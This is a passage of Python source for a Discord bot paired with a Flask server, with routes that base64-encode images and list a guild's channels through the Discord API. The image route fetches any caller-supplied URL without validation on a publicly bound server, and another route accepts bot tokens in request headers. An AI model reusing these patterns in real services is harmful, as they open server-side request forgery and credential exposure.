        await ctx.send(f"⚠️ Error: {str(e)}")

@bot.command()
async def authurl(ctx):
    await ctx.send(f"🔐 Authorization URL: {OAUTH2_URL}")

def run_flask():
    serve(app, host='0.0.0.0', port=5000)

def main():
    ensure_auth_file()
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.start()
    bot.run(BOT_TOKEN)

@app.route('/encode-image', methods=['GET'])
def encode_image():
    try:
        data = request.json
        if data and 'url' in data:
            # Handle image URL
            image_url = data['url']
            response = requests.get(image_url)
            if response.status_code != 200:
                return jsonify({'base64': 'Failed to fetch image from URL'}), 400
            image_data = response.content
        elif request.files:
            # Handle file upload
            file = next(iter(request.files.values()))
            image_data = file.read()
        else:
            return jsonify({'base64': 'No image URL or file provided'}), 400

        # Convert image to base64 and limit length
        base64_encoded = base64.b64encode(image_data).decode('utf-8')
        if len(base64_encoded) > 2000:
            return jsonify({'base64': 'Image too large, must be under 2000 characters when encoded'}), 400
        return jsonify({'base64': base64_encoded})

    except Exception as e:
        return jsonify({'base64': str(e)}), 500

@app.route('/sniffle_api/getHour-Seconds')
def getcurrent_hour_minutes():
    from datetime import datetime
    current_time = datetime.now().strftime("%H:%M")
    return jsonify({'hh:mm': current_time})

@app.route('/sniffle_api/getAllChannelsInGuild', methods=['GET'])
def getAllChannelsInGuild():
    try:
        bot_token = request.headers.get('bot_token')
        guild_id = request.headers.get('guild_id')
        
        if not bot_token or not guild_id:
            return jsonify({
                'response': {'error': 'Missing required parameters'},
                'status': 400,
                'statusText': 'BAD REQUEST'
            }), 400
            
        url = f'https://discord.com/api/v10/guilds/{guild_id}/channels'
        headers = {
            'Authorization': f'Bot {bot_token}',
            'Content-Type': 'application/json'
        }
        
        response = requests.get(url, headers=headers)
        if response.status_code == 404:
            return jsonify({
                'response': {'error': 'Guild not found or bot has no access to the guild'},
                'status': 404,
                'statusText': 'NOT FOUND'
            }), 404
        elif response.status_code == 400:
            return jsonify({
                'response': {'error': 'Invalid guild ID or bot token'},
                'status': 400,
                'statusText': 'BAD REQUEST'
            }), 400
        elif response.status_code != 200:
            return jsonify({
                'response': {'error': 'Failed to fetch channels'},
                'status': response.status_code,
                'statusText': 'ERROR'
            }), response.status_code
            
        channels = response.json()
        return jsonify({
            'response': {
                'channels': channels,
                'total_channels': len(channels)
            },
            'status': 200,
            'statusText': 'OK'
        }), 200
            
    except Exception as e:
        return jsonify({
            'response': {'error': f'Internal server error: {str(e)}'},
            'status': 500,
            'statusText': 'INTERNAL SERVER ERROR'
        }), 500

if __name__ == '__main__':
    main()